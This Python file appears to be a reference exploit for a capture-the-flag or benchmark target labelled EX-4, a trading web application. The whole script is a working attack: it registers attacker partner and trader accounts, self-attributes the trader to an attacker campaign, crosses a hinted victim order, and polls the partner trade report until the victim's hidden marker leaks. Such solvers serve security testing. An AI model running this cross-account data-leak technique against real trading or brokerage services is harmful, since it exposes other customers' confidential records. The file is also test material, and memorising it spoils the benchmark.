#!/usr/bin/env python3
"""Reference exploit for EX-4 partner report enrichment overreach.

The exploit uses ordinary public HTTP APIs only. It creates an attacker-owned
partner campaign, self-attributes an attacker spot account to that campaign,
crosses a hinted victim order, reads the vulnerable partner trade report, and
prints only the recovered flag.
"""

from __future__ import annotations

import json
import secrets
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from typing import Any, Mapping


TIMEOUT = 5
ATTACKER_NOTE = "ex4-attributed-trader"


class ExploitError(Exception):
    pass


def main(argv: list[str]) -> int:
    if len(argv) != 3:
        print("usage: ex_partner_report_enrichment.py <host> <attack-data-json>", file=sys.stderr)
        return 2

    try:
        host = normalize_base_url(argv[1])
        attack_data = parse_attack_data(argv[2])
        partner_token, spot_token, campaign = prepare_partner_and_attribution(host)
        cross_victim_order(host, spot_token, attack_data)
        report = partner_trade_report(host, partner_token, campaign["id"])
        flag = extract_flag(report)
    except ExploitError as error:
        print(str(error), file=sys.stderr)
        return 1

    print(flag)
    return 0


def parse_attack_data(raw: str) -> Mapping[str, Any]:
    try:
        data = json.loads(raw)
    except json.JSONDecodeError as error:
        raise ExploitError("invalid attack data") from error
    if not isinstance(data, Mapping):
        raise ExploitError("attack data must be an object")
    if isinstance(data.get("public"), Mapping):
        data = data["public"]
    if data.get("place") not in (2, "2") and data.get("ex_id") != "EX-4":
        raise ExploitError("attack data is not for a broker-report receipt target")
    return data


def prepare_partner_and_attribution(host: str) -> tuple[str, str, Mapping[str, Any]]:
    nonce = secrets.token_hex(8)
    partner_token = register_user(host, f"ex4-partner-{nonce}", "partner")
    spot_token = register_user(host, f"ex4-spot-{nonce}", "spot")
    faucet(host, spot_token, f"ex4-spot-fund-{nonce}")
    campaign_code = f"ex4-{nonce}"
    campaign_response = request_json(
        host,
        "POST",
        "/api/broker/campaigns",
        payload={"campaign_code": campaign_code, "name": "EX-4 campaign"},
        token=partner_token,
    )
    campaign = campaign_response.get("campaign")
    if not isinstance(campaign, Mapping):
        raise ExploitError("campaign response missing")
    request_json(
        host,
        "POST",
        "/api/broker/attributions",
        payload={"campaign_code": campaign_code},
        token=spot_token,
    )
    return partner_token, spot_token, campaign


def register_user(host: str, username: str, account_profile: str) -> str:
    response = request_json(
        host,
        "POST",
        "/api/auth/register",
        payload={
            "username": username,
            "password": f"Vx-{secrets.token_urlsafe(18)}",
            "account_profile": account_profile,
        },
    )
    token = response.get("session", {}).get("token") if isinstance(response.get("session"), Mapping) else None
    if not isinstance(token, str) or not token:
        raise ExploitError("registration failed")
    return token


def faucet(host: str, token: str, idempotency_key: str) -> None:
    request_json(
        host,
        "POST",
        "/api/faucet",
        payload={"idempotency_key": idempotency_key},
        token=token,
    )


def cross_victim_order(host: str, token: str, attack_data: Mapping[str, Any]) -> None:
    market_symbol = required_string(attack_data, "market", fallback_key="market_symbol")
    victim_side = required_string(attack_data, "side_hint", fallback_key="side")
    price = price_from_attack_data(attack_data, victim_side)
    quantity = required_string(attack_data, "quantity")
    side = opposite_side(victim_side)
    order_ref = f"ex4-{secrets.token_hex(6)}"
    request_json(
        host,
        "POST",
        "/api/orders",
        payload={
            "market_symbol": market_symbol,
            "side": side,
            "order_type": "limit",
            "limit_price": price,
            "quantity": quantity,
            "order_ref": order_ref,
            "reference_code": order_ref,
            "client_order_id": order_ref,
        },
        token=token,
    )


def partner_trade_report(host: str, token: str, campaign_id: Any) -> list[Mapping[str, Any]]:
    encoded = urllib.parse.quote(str(campaign_id), safe="")
    last_rows: list[Mapping[str, Any]] = []
    for _attempt in range(30):
        response = request_json(host, "GET", f"/api/broker/reports/trades?campaign_id={encoded}", token=token)
        trades = response.get("trades")
        if not isinstance(trades, list):
            raise ExploitError("partner report response missing")
        last_rows = [trade for trade in trades if isinstance(trade, Mapping)]
        if extract_flag(last_rows, required=False):
            return last_rows
        time.sleep(0.25)
    return last_rows


def extract_flag(rows: list[Mapping[str, Any]], *, required: bool = True) -> str | None:
    for row in rows:
        for key in ("booking_marker", "source_marker", "desk_ref"):
            value = row.get(key)
            if isinstance(value, str) and value and value != ATTACKER_NOTE:
                return value
    if required:
        raise ExploitError("flag not found in partner report")
    return None


def request_json(
    host: str,
    method: str,
    path: str,
    *,
    payload: Mapping[str, Any] | None = None,
    token: str | None = None,
) -> Mapping[str, Any]:
    body = None
    headers = {"Accept": "application/json"}
    if payload is not None:
        body = json.dumps(payload, sort_keys=True, separators=(",", ":")).encode("utf-8")
        headers["Content-Type"] = "application/json"
    if token:
        headers["Authorization"] = f"Bearer {token}"

    last_error: Exception | None = None
    for _attempt in range(3):
        request = urllib.request.Request(host + path, data=body, headers=headers, method=method)
        try:
            with urllib.request.urlopen(request, timeout=TIMEOUT) as response:
                raw = response.read()
                break
        except urllib.error.HTTPError as error:
            if error.code < 500:
                raise ExploitError(f"unexpected HTTP status {error.code}") from error
            last_error = error
        except OSError as error:
            last_error = error
    else:
        raise ExploitError("service unavailable") from last_error

    try:
        data = json.loads(raw.decode("utf-8"))
    except (UnicodeDecodeError, json.JSONDecodeError) as error:
        raise ExploitError("invalid JSON response") from error
    if not isinstance(data, Mapping):
        raise ExploitError("JSON response must be an object")
    return data


def required_string(data: Mapping[str, Any], key: str, *, fallback_key: str | None = None) -> str:
    value = data.get(key)
    if (not isinstance(value, str) or not value) and fallback_key:
        value = data.get(fallback_key)
    if not isinstance(value, str) or not value:
        raise ExploitError(f"{key} missing")
    return value


def price_from_attack_data(data: Mapping[str, Any], victim_side: str) -> str:
    bucket = data.get("price_bucket")
    if isinstance(bucket, str) and "-" in bucket:
        lower, upper = bucket.split("-", 1)
        lower = lower.strip()
        upper = upper.strip()
        selected = upper if victim_side == "sell" else lower
        if selected:
            return selected
    return required_string(data, "price", fallback_key="limit_price")


def opposite_side(side: str) -> str:
    if side == "buy":
        return "sell"
    if side == "sell":
        return "buy"
    raise ExploitError("side is invalid")


def normalize_base_url(host: str) -> str:
    if not host:
        raise ExploitError("host is required")
    host = host.strip()
    if not host.startswith(("http://", "https://")):
        host = "http://" + host
    return host.rstrip("/")


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
